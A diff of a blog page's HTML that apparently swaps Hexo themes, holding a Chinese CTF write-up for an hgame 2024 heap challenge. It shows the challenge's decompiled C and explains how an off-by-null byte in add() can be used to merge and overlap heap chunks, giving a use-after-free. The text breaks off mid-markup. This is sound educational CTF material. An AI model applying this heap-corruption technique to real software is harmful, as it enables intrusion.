@@ -1,2035 +1,722 @@
-<!DOCTYPE html>
-<html lang="en">
-    <!-- title -->
-
-
-    
-
-<!-- keywords -->
-
-
-
+<!DOCTYPE HTML>
+<html>
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="author" content="nyyyddddn">
-    <meta name="renderer" content="webkit">
-    <meta name="copyright" content="nyyyddddn">
-    
-        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
-    
-    <meta name="description" content="">
-    <meta name="description" content="pwn你满了,那我就漫出来了![补]123456789101112131415161718192021222324252627282930313233343536373839int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&amp;#123;  unsigned int v3; &#x2F;&#x2F; [rsp+4h] [">
-<meta property="og:type" content="article">
-<meta property="og:title" content="hgame2024week3_wp">
-<meta property="og:url" content="https://nyyyddddn.github.io/2024/02/27/hgame2024week3-wp/index.html">
-<meta property="og:site_name" content="nyyyddddn">
-<meta property="og:description" content="pwn你满了,那我就漫出来了![补]123456789101112131415161718192021222324252627282930313233343536373839int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&amp;#123;  unsigned int v3; &#x2F;&#x2F; [rsp+4h] [">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-02-27T09:21:04.000Z">
-<meta property="article:modified_time" content="2024-02-27T09:23:07.422Z">
-<meta property="article:author" content="nyyyddddn">
-<meta property="article:tag" content="ctf writeup">
-<meta name="twitter:card" content="summary">
-    <meta http-equiv="Cache-control" content="no-cache">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <link rel="icon" href="/null">
-    
-    <title>hgame2024week3_wp · nyyyddddn&#39;s blog</title>
-    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
-/* This file is meant as a standalone workflow for
-- testing support for link[rel=preload]
-- enabling async CSS loading in browsers that do not support rel=preload
-- applying rel preload css once loaded, whether supported or not.
-*/ -->
-<script>
-    (function (w) {
-        'use strict'
-        // rel=preload support test
-        if (!w.loadCSS) {
-            w.loadCSS = function () {}
-        }
-        // define on the loadCSS obj
-        var rp = (loadCSS.relpreload = {})
-        // rel=preload feature support test
-        // runs once and returns a function for compat purposes
-        rp.support = (function () {
-            var ret
-            try {
-                ret = w.document.createElement('link').relList.supports('preload')
-            } catch (e) {
-                ret = false
-            }
-            return function () {
-                return ret
-            }
-        })()
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>hgame2024week3_wp | nyyyddddn</title>
+  <meta name="author" content="nyyyddddn">
+  
+  <meta name="description" content="pwn你满了,那我就漫出来了![补]int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+&amp;#123;
+  unsigned int v3; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v4; // [rsp+8h] [rbp-8h]
 
-        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-        // then change that media back to its intended value on load
-        rp.bindMediaToggle = function (link) {
-            // remember existing media attr for ultimate state, or default to 'all'
-            var finalMedia = link.media || 'all'
+  v4 = __readfsqword(0x28u);
+  init(argc, argv, envp);
+  while ( 1 )
+  &amp;#123;
+    while ( 1 )
+    &amp;#123;
+      menu();
+      __isoc99_scanf(&#34;%u&#34;, &amp;amp;v3);
+      if ( v3 != 2 )
+        break;
+      show();
+    &amp;#125;
+    if ( v3 &gt; 2 )
+    &amp;#123;
+      if ( v3 == 3 )
+      &amp;#123;
+        delete();
+      &amp;#125;
+      else
+      &amp;#123;
+        if ( v3 == 4 )
+          exit(0);
+LABEL_13:
+        puts(&#34;Invalid choice&#34;);
+      &amp;#125;
+    &amp;#125;
+    else
+    &amp;#123;
+      if ( v3 != 1 )
+        goto LABEL_13;
+      add();
+    &amp;#125;
+  &amp;#125;
+&amp;#125;
 
-            function enableStylesheet() {
-                link.media = finalMedia
-            }
+unsigned __int64 delete()
+&amp;#123;
+  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
 
-            // bind load handlers to enable media
-            if (link.addEventListener) {
-                link.addEventListener('load', enableStylesheet)
-            } else if (link.attachEvent) {
-                link.attachEvent('onload', enableStylesheet)
-            }
+  v2 = __readfsqword(0x28u);
+  printf(&#34;Index: &#34;);
+  __isoc99_scanf(&#34;%u&#34;, &amp;amp;v1);
+  if ( v1 &gt; 0xF )
+  &amp;#123;
+    puts(&#34;There are only 16 pages.&#34;);
+  &amp;#125;
+  else if ( *((_QWORD *)&amp;amp;notes + v1) )
+  &amp;#123;
+    free(*((void **)&amp;amp;notes + v1));
+    *((_QWORD *)&amp;amp;notes + v1) = 0LL;
+  &amp;#125;
+  else
+  &amp;#123;
+    puts(&#34;No such note.&#34;);
+  &amp;#125;
+  return __readfsqword(0x28u) ^ v2;
+&amp;#125;
 
-            // Set rel and non-applicable media type to start an async request
-            // note: timeout allows this to happen async to let rendering continue in IE
-            setTimeout(function () {
-                link.rel = 'stylesheet'
-                link.media = 'only x'
-            })
-            // also enable media after 3 seconds,
-            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-            setTimeout(enableStylesheet, 3000)
-        }
+unsigned __int64 add()
+&amp;#123;
+  unsigned int v0; // ebx
+  unsigned int v2; // [rsp+Ch] [rbp-24h] BYREF
+  unsigned int size; // [rsp+10h] [rbp-20h] BYREF
+  unsigned int size_4; // [rsp+14h] [rbp-1Ch]
+  unsigned __int64 v5; // [rsp+18h] [rbp-18h]
 
-        // loop through link elements in DOM
-        rp.poly = function () {
-            // double check this to prevent external calls from running
-            if (rp.support()) {
-                return
-            }
-            var links = w.document.getElementsByTagName('link')
-            for (var i = 0; i < links.length; i++) {
-                var link = links[i]
-                // qualify links to those with rel=preload and as=style attrs
-                if (
-                    link.rel === 'preload' &&
-                    link.getAttribute('as') === 'style' &&
-                    !link.getAttribute('data-loadcss')
-                ) {
-                    // prevent rerunning on link
-                    link.setAttribute('data-loadcss', true)
-                    // bind listeners to toggle media back
-                    rp.bindMediaToggle(link)
-                }
-            }
-        }
+  v5 = __readfsqword(0x28u);
+  printf(&#34;Index: &#34;);
+  __isoc99_scanf(&#34;%u&#34;, &amp;amp;v2);
+  if ( v2 &gt; 0xF )
+  &amp;#123;
+    puts(&#34;There are only 16 pages.&#34;);
+  &amp;#125;
+  else if ( *((_QWORD *)&amp;amp;notes + v2) )
+  &amp;#123;
+    puts(&#34;The note already exists.&#34;);
+  &amp;#125;
+  else
+  &amp;#123;
+    while ( 1 )
+    &amp;#123;
+      printf(&#34;Size: &#34;);
+      __isoc99_scanf(&#34;%u&#34;, &amp;amp;size);
+      if ( size &amp;lt;= 0xFF )
+        break;
+      puts(&#34;Too big!&#34;);
+    &amp;#125;
+    v0 = v2;
+    *((_QWORD *)&amp;amp;notes + v0) = malloc(size);
+    printf(&#34;Content: &#34;);
+    size_4 = read(0, *((void **)&amp;amp;notes + v2), size);
+    *(_BYTE *)(*((_QWORD *)&amp;amp;notes + v2) + size_4) = 0;
+  &amp;#125;
+  return __readfsqword(0x28u) ^ v5;
+&amp;#125;
 
-        // if unsupported, run the polyfill
-        if (!rp.support()) {
-            // run once at least
-            rp.poly()
+题目没有uaf,但是在add的时候有一个off by null，可以通过off by null 触发一次堆合并 构造 一个heap overlap的现象，产生uaf
+构造一个这样的情况，在add heap3的时候，heap4的低位一个字节就会被覆盖成 0x00，如果在创建 heap4的时候size 大于等于 0xf8，这时候chunk的大小为 0xf0 + 0x10(size + 8) + 1(prev_inuse)，在add heap3的时候 prev_inuse就会被覆盖，再free掉 heap4的时候就会触发 前向合并，将 heap 1 2 3 4合并在一起
+heap 1(free) (content &amp;quot;AAAA&amp;quot;) 
+heap 2(In use) (content &amp;quot;AAAA&amp;quot;)
+heap 3(In use) (content &amp;quot;A&amp;quot; * (data  - 8) + p64(heap 1 size+ heap2 size+ heap3 size))
+heap 4(In use) (content &amp;quot;AAAA&amp;quot;) 
+High Address
 
-            // rerun poly on an interval until onload
-            var run = w.setInterval(rp.poly, 500)
-            if (w.addEventListener) {
-                w.addEventListener('load', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            } else if (w.attachEvent) {
-                w.attachEvent('onload', function () {
-                    rp.poly()
-                    w.clearInterval(run)
-                })
-            }
-        }
+这时候再malloc 5 6 7 8 那就会产生一个堆重叠现象
+1 - 5
+2 - 6
+3 - 7
+4 - 8"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-        // commonjs
-        if (typeof exports !== 'undefined') {
-            exports.loadCSS = loadCSS
-        } else {
-            w.loadCSS = loadCSS
-        }
-    })(typeof global !== 'undefined' ? global : this)
-</script>
+  <meta property="og:title" content="hgame2024week3_wp"/>
+  <meta property="og:site_name" content="nyyyddddn"/>
 
-    <style type="text/css">
-    @font-face {
-        font-family: 'Oswald-Regular';
-        src: url("/font/Oswald-Regular.ttf");
-    }
+  
+    <meta property="og:image" content=""/>
+  
 
-    body {
-        margin: 0;
-    }
+  
+    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
-    header,
-    footer,
-    .back-top,
-    .sidebar,
-    .container,
-    .site-intro-meta,
-    .toc-wrapper {
-        display: none;
-    }
+  <script src="/js/jquery-2.0.3.min.js"></script>
 
-    .site-intro {
-        position: relative;
-        z-index: 3;
-        width: 100%;
-        /* height: 50vh; */
-        overflow: hidden;
-    }
+  <!-- analytics -->
+  
 
-    .site-intro-placeholder {
-        position: absolute;
-        z-index: -2;
-        top: 0;
-        left: 0;
-        width: calc(100% + 300px);
-        height: 100%;
-        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
-        background-position: center center;
-        transform: translate3d(-226px, 0, 0);
-        animation: gradient-move 2.5s ease-out 0s infinite;
-    }
 
-    @keyframes gradient-move {
-        0% {
-            transform: translate3d(-226px, 0, 0);
-        }
-        100% {
-            transform: translate3d(0, 0, 0);
-        }
-    }
-</style>
 
-    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
-    <link rel="stylesheet" href="/css/dark.css">
-    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
-    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
-    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
-    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
-    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
-    <!-- algolia -->
-    
-    <!-- 百度统计  -->
-    
-    <!-- 谷歌统计  -->
-    
+
 <meta name="generator" content="Hexo 6.3.0"></head>
 
-    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
-    <script type="text/javascript">
-        if (typeof window.$ == undefined) {
-            console.warn('jquery load from jsdelivr failed, will load local script')
-            document.write('<script src="/lib/jquery.min.js" />')
-        }
-    </script>
-    
-        <body class="post-body">
-    
-        <!-- header -->
-        <header class="header header-mobile">
-    <!-- top read progress line -->
-    <div class="header-element">
-        <div class="read-progress"></div>
-    </div>
-    <!-- sidebar menu button -->
-    <div class="header-element">
-        
-            <div class="header-sidebar-menu">
-        
-            
-                <div style="padding-left: 1px;">&#xe775;</div>
-            
-        </div>
-    </div>
-    <!-- header actions -->
-    <div class="header-actions">
-        <!-- theme mode switch button -->
-        <span class="header-theme-btn header-element">
-            <i class="fas fa-adjust"></i>
-        </span>
-        <!-- back to home page text -->
-        <span class="home-link header-element">
-            <a href=/>nyyyddddn</a>
-        </span>
-    </div>
-    <!-- toggle banner for post layout -->
-    
-        
-            <div class="banner">
-        
-            <div class="blog-title header-element">
-                <a href="/">nyyyddddn</a>
-            </div>
-            <div class="post-title header-element">
-                <a href="#" class="post-name">hgame2024week3_wp</a>
-            </div>
-        </div>
-    
-</header>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">nyyyddddn</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/catergories" title="All the catergories.">
+			  <i class=""></i>Catergories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
 
-        <!-- fixed footer -->
-        <footer class="footer-fixed">
-    <!-- back to top button -->
-    <div class="footer-fixed-element">
-        
-            <div class="back-top back-top-hidden">
-        
-        
-            <div>&#xe639;</div>
-        
-        </div>
-    </div>
-</footer>
+  <div class="container">
+  	<div class="content">
+    	 
 
-        <!-- wrapper -->
-        <div class="wrapper">
-            <div class="site-intro" style="
+
+	
+		<div class="page-header">
+			<h1> hgame2024week3_wp</h1>
+		</div>
+	
 
 
 
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
 
+	<!-- content -->
+	<div class="mypage">		
+	  		
 
+	  <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="你满了-那我就漫出来了-补"><a href="#你满了-那我就漫出来了-补" class="headerlink" title="你满了,那我就漫出来了![补]"></a>你满了,那我就漫出来了![补]</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl __noreturn <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>
 
+  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+      <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">&#123;</span>
+        <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token keyword">else</span>
+      <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
+          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+LABEL_13<span class="token operator">:</span>
+        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid choice"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+        <span class="token keyword">goto</span> LABEL_13<span class="token punctuation">;</span>
+      <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-    height:50vh;
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
+  <span class="token keyword">unsigned</span> __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>
 
-">
-    
-    <!-- 主页  -->
-    
-        
-    <!-- 404页  -->
-    
-    <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
-    <div class="site-intro-meta">
-        <!-- 标题  -->
-        <h1 class="intro-title">
-            <!-- 主页  -->
-            
-                hgame2024week3_wp
-            <!-- 404 -->
-            
-        </h1>
-        <!-- 副标题 -->
-        <p class="intro-subtitle">
-            <!-- 主页副标题  -->
-            
-                
-            <!-- 404 -->
-            
-        </p>
-        <!-- 文章页 meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf writeup">ctf writeup</a>
-    
-</div>
+  v2 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">0xF</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"There are only 16 pages."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>notes <span class="token operator">+</span> v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"No such note."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v2<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-                
-                <!-- 文章字数统计 -->
-                
-                <div class="post-intro-meta">
-                    <!-- 撰写日期 -->
-                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2024/02/27</span>
-                    <!-- busuanzi -->
-                    
-                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    
-                    <!-- 文章分享 -->
-                    <span class="share-wrapper">
-                        <span class="iconfont-archer share-icon">&#xe71d;</span>
-                        <span class="share-text">Share</span>
-                        <ul class="share-list">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
-        
-    </div>
-</div>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-24h] BYREF</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h] BYREF</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> size_4<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1Ch]</span>
+  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>
 
-            <script>
-  // get user agent
-  function getBrowserVersions() {
-    var u = window.navigator.userAgent
-    return {
-      userAgent: u,
-      trident: u.indexOf('Trident') > -1, //IE内核
-      presto: u.indexOf('Presto') > -1, //opera内核
-      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
-      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
-      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
-      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
-      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
-      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
-      iPad: u.indexOf('iPad') > -1, //是否为iPad
-      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
-      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
-      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
-    }
-  }
-  var browser = {
-    versions: getBrowserVersions(),
-  }
-  console.log('userAgent: ' + browser.versions.userAgent)
-
-  // callback
-  function fontLoaded() {
-    console.log('font loaded')
-    if (document.getElementsByClassName('site-intro-meta')) {
-      document
-        .getElementsByClassName('intro-title')[0]
-        .classList.add('intro-fade-in')
-      document
-        .getElementsByClassName('intro-subtitle')[0]
-        .classList.add('intro-fade-in')
-      var postIntros = document.getElementsByClassName('post-intros')[0]
-      if (postIntros) {
-        postIntros.classList.add('post-fade-in')
-      }
-    }
-  }
-
-  // UC不支持跨域，所以直接显示
-  function asyncCb() {
-    if (browser.versions.uc) {
-      console.log('UCBrowser')
-      fontLoaded()
-    } else {
-      WebFont.load({
-        custom: {
-          families: ['Oswald-Regular'],
-        },
-        loading: function () {
-          // 所有字体开始加载
-          // console.log('font loading');
-        },
-        active: function () {
-          // 所有字体已渲染
-          fontLoaded()
-        },
-        inactive: function () {
-          // 字体预加载失败，无效字体或浏览器不支持加载
-          console.log('inactive: timeout')
-          fontLoaded()
-        },
-        timeout: 5000, // Set the timeout to two seconds
-      })
-    }
-  }
-
-  function asyncErr() {
-    console.warn('script load from CDN failed, will load local script')
-  }
-
-  // load webfont-loader async, and add callback function
-  function async(u, cb, err) {
-    var d = document,
-      t = 'script',
-      o = d.createElement(t),
-      s = d.getElementsByTagName(t)[0]
-    o.src = u
-    if (cb) {
-      o.addEventListener(
-        'load',
-        function (e) {
-          cb(null, e)
-        },
-        false
-      )
-    }
-    if (err) {
-      o.addEventListener(
-        'error',
-        function (e) {
-          err(null, e)
-        },
-        false
-      )
-    }
-    s.parentNode.insertBefore(o, s)
-  }
-
-  var asyncLoadWithFallBack = function (arr, success, reject) {
-    var currReject = function () {
-      reject()
-      arr.shift()
-      if (arr.length) async(arr[0], success, currReject)
-    }
-
-    async(arr[0], success, currReject)
-  }
-
-  asyncLoadWithFallBack(
-    [
-      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
-      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
-      "/lib/webfontloader.min.js",
-    ],
-    asyncCb,
-    asyncErr
-  )
-</script>
-
-            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
-            <div class="container container-unloaded">
-                <main class="main post-page">
-    <article class="article-entry">
-        <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="你满了-那我就漫出来了-补"><a href="#你满了-那我就漫出来了-补" class="headerlink" title="你满了,那我就漫出来了![补]"></a>你满了,那我就漫出来了![补]</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 